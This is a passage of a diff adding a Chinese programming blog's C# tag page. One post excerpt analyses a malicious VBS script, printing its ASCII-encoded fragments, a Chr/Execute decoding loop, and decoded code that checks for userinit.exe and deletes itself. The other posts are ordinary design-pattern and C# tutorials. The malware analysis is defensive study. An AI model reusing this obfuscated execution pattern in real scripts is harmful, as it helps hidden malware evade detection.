116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101) 后半段是 For i = 0 To UBound(strs) runner = runner &amp; Chr(strs(i)) Next Execute runner 虽说对vbs不怎么熟，但也知道vbs经常用来写个启动项啊。加个用户啊。之类的。后半句很好懂。就是把ascii码转换成字符串，然后执行。字面意思看看就行了。其实应该可以直接将Execute runner 改为 MsgBox runner就能输出了。但eset不能关闭。所以最后还是选择用C#来写了。
+解码嘛。很简单。VS刚好开着。直接写吧。 byte[] strs = {68，101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101}; System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding(); Console.WriteLine(asciiEncoding.GetString(strs)); 运行后输出 Do Set objWMIService = GetObject(&ldquo;winmgmts:\.\root\cimv2&rdquo;) Set colProcesses = objWMIService.ExecQuery(&ldquo;Select * from Win32_Process&rdquo;) FoundProcess = 0 For Each objProcess In colProcesses If objProcess.Name = &ldquo;userinit.exe&rdquo; Then FoundProcess = 1 Exit For End If Next If FoundProcess = 0 Then Exit Do WScript.
+                  <a href="https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AE%89%E5%85%A8/">安全</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%AC%94%E8%AE%B0/">笔记</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/23/%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF/">
+                <h2 class="post-title">获取操作系统版本信息</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 23, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (274 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  坊间流传的代码都有些问题，比如不能正常获取win7以上的版本信息，不能获取诸如专业版，旗舰版等的信息，不能正常获取操作系统位的信息。
+使用代码，写了一个简单的库来实现效果。用法大概如下： StringBuilder sb = new StringBuilder(String.Empty); sb.AppendLine(&ldquo;Operation System Information&rdquo;); sb.AppendLine(&ldquo;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-&rdquo;); sb.AppendLine(String.Format(&ldquo;Name = {0}&rdquo;, OSVersionInfo.Name)); sb.AppendLine(String.Format(&ldquo;Edition = {0}&rdquo;, OSVersionInfo.Edition)); if (OSVersionInfo.ServicePack!=string.Empty) sb.AppendLine(String.Format(&ldquo;Service Pack = {0}&rdquo;, OSVersionInfo.ServicePack)); else sb.AppendLine(&ldquo;Service Pack = None&rdquo;); sb.AppendLine(String.Format(&ldquo;Version = {0}&rdquo;, OSVersionInfo.VersionString)); sb.AppendLine(String.Format(&ldquo;ProcessorBits = {0}&rdquo;, OSVersionInfo.ProcessorBits)); sb.AppendLine(String.Format(&ldquo;OSBits = {0}&rdquo;, OSVersionInfo.OSBits)); sb.AppendLine(String.Format(&ldquo;ProgramBits = {0}&rdquo;, OSVersionInfo.ProgramBits));
+textBox1.Text = sb.ToString(); 对比一下坊间的几种不足： 总的来说。最大的问题就是不能正确检测你的操作系统到底是32位还是64位。几种方法大致如下： 1. 使用IntPtr指针的大小 最关键的一句代码是： return IntPtr.Size * 8; 但是事实上，这个返回的不是操作系统的位数，返回的是运行的程序的位数，如果在64位的windows上以32位的模式运行了这个程序，那么就会返回32.
+2. 使用PROCESSOR_ARCHITECTURE 环境变量 string pa = Environment.GetEnvironmentVariable(&ldquo;PROCESSOR_ARCHITECTURE&rdquo;); return ((String.IsNullOrEmpty(pa) || String.
+                  <a href="https://leizhiyuan.github.io/2012/11/23/%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%BD%AF%E4%BB%B6/">软件</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/18/c#%E4%B8%AD%E7%9A%84throw/">
+                <h2 class="post-title">C#中的throw</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 18, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (199 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  Throw会抛出/传递异常,通过在catch块里使用throw语句.可以改变产生的异常,比如我们可以抛出一个新的异常,throw语句有各种各样的,并且很有必要.
+例子 我们首先看一下三个方法,分别叫做A,B,C，他们使用不同的throw语句。方法A使用了无参的throw语句。这可以被看作是rethrow(继续抛出)—他会抛出已经出现的同样的异常
+继续，方法B throw一个命名的异常变量。这就不是一个完全的rethrow了—因为他虽然抛出了同样的异常。但是改变了StackTrace（堆栈轨迹），如果有必要的话，我们可以收集一些异常信息，而方法C则创建了一个新的异常。 提示:你可以通过这种方法实现自定义的的错误处理 使用throw语句的例子 using System; class Program { static void Main() { try { A(); B(); C(null); } catch (Exception ex) { Console.WriteLine(ex); } }
+static void A() { // Rethrow 语法. try { int value = 1 / int.Parse(&#34;0&#34;); } catch { throw; } } static void B() { // 过滤异常类型. try { int value = 1 / int.Parse(&#34;0&#34;); } catch (DivideByZeroException ex) { throw ex; } } static void C(string value) { // 创建新的异常.
+                  <a href="https://leizhiyuan.github.io/2012/11/18/c#%E4%B8%AD%E7%9A%84throw/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/10/25/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F/">
+                <h2 class="post-title">理解并实现模板模式</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on October 25, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (167 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  介绍 本文实现模板模式
+背景 有时候我们需要做很多任务，而做这些任务的算法可能不同，这样可以设计成策略模式，这样。执行该任务的基本的一些代码就是一样的。但程序可可以动态的切换来执行任务的不同部分了。
+现在，真实的情况是有些算法，从实现层面山看，有可能有一些步骤是不一样的，这种情况下。我们可以使用继承来完成。
+当有个算法，而这个算法的一部分却多样的时候。使用模板模式就很好。GoF定义模板模式为：
+ &ldquo;Define the skeleton of an algorithm in an operation, deferring some steps to subclasses. Template Method lets subclasses redefine certain steps of an algorithm without changing the algorithm&rsquo;s structure.&rdquo;.
+ 定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。模板模式使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。
+ 在上面的类图中： AbstractClass：包含两种方法。第一种就是算法的每一步。另一种就是模板方法。模板方法就是那些可以被用在所有独立方法中。并且提供了算法执行的一个骨架 ConcreteClass：这个类重写了抽象类中每一步的方法，包含对这些步骤的个性化实现。
+使用代码 看一个简单的例子。假想我们有一个类用来读取数据。并且能够为信息管理系统到处数据。
+abstract class DataExporter { // 这个方法都是一致的 public void ReadData() { Console.WriteLine("Reading the data from SqlServer"); } // 当报表格式顶的时候这个也是定的。 public void FormatData() { Console.WriteLine("Formating the data as per requriements.
+                  <a href="https://leizhiyuan.github.io/2012/10/25/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%AD%A6%E6%B1%89/">武汉</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%BD%AF%E4%BB%B6/">软件</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/10/23/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E5%A4%96%E8%A7%82%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">
+                <h2 class="post-title">理解并实现外观设计模式</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on October 23, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 3 minutes (446 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  介绍 本文介绍外观模式,并给出简单的实现示例
+背景
+写软件的时候,有时候需要处理一系列的对象来完成一个确定的任务.比如,我们给一个万能遥控器写代码,我们需要关掉所有的设备,那么,我们有这样几种选择.第一个就是手动选择每一个设备,然后一个接一个的关闭,这好傻.那我们为什么不再遥控器上放一个按钮,我们按一下就关掉了.按钮的命令会与设备控制器通信然后关掉他们.
+如果我们又想在晚上12的时候自动关闭设备,那么我们就会有一个基于事件的计时器,与设备通信,然后关闭设备,问题是在两种情况下我们都需要与这些对象通信的函数.
+有很多方法解决这个问题,为什么不能有一个对象,该对象的责任就是关闭设备,当我要关闭设备的时候,我调用该对象就行了.这也是外观模式的理念Gof大神定义外观模式 &ldquo;Provide a unified interface to a set of interfaces in a subsystem. Façade defines a higher-level interface that makes the subsystem easier to use.&rdquo;
+为子系统中的一组接口提供一个一致的界面，外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。
+看看模式图 
+注意外观对象仅仅是提供了对函数一起操作,.不能替换子系统的接口.子系统的类仍然可以被系统的其他部分访问.外观为子系统提供了一致的界面.
+使用代码 为了模拟外观模式,我们模拟一个小例子.试着实现一个简单的外观对象,该外观对象操作一些WP手机的控制器对象,我们先定义问题
+每天早上我跑步的时候,我都得对我的手机做出以下的事情.. 1. 关闭wifi 2. 切换到移动网络 3. 打开GPS 4. 打开音乐 5. 开始跑步追踪器
+跑完以后.,我又蛋疼的做出以下几件事 1. 在twitter和facebook上分享我的跑步数据 2. 关闭跑步追踪器 3. 关闭音乐 4. 关闭GPS 5. 关闭移动数据 6. 打开wifi
+目前我都是手工做的.,我们来实现这些假想的控制器类吧. class GPSController { bool isSwitchedOn = false;
+public bool IsSwitchedOn { get { return isSwitchedOn; } set { isSwitchedOn = value; DisplayStatus(); } } private void DisplayStatus() { string status = (isSwitchedOn == true) ?
+                  <a href="https://leizhiyuan.github.io/2012/10/23/%E7%90%86%E8%A7%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0%E5%A4%96%E8%A7%82%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%AD%A6%E6%B1%89/">武汉</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+        </div>
+        
+          <ul class="pager main-pager">
+            
+              <li class="previous">
+                <a href="/tags/c/page/2/">&larr; Newer Posts</a>
+              </li>
+            
+            
+              <li class="next">
+                <a href="/tags/c/page/4/">Older Posts &rarr;</a>
+              </li>
+            
+          </ul>
+        
+      </div>
+    </div>
+  </div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/leizhiyuan" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            
+            <a href="https://leizhiyuan.github.io/tags/c/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              <a href="leaver.me">bystander</a>
+            
+          
+
+          &nbsp;&bull;&nbsp;
+          2018
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://leizhiyuan.github.io/">bystander&#39;s blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.49.2</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://leizhiyuan.github.io/js/main.js"></script>
+<script src="https://leizhiyuan.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://leizhiyuan.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
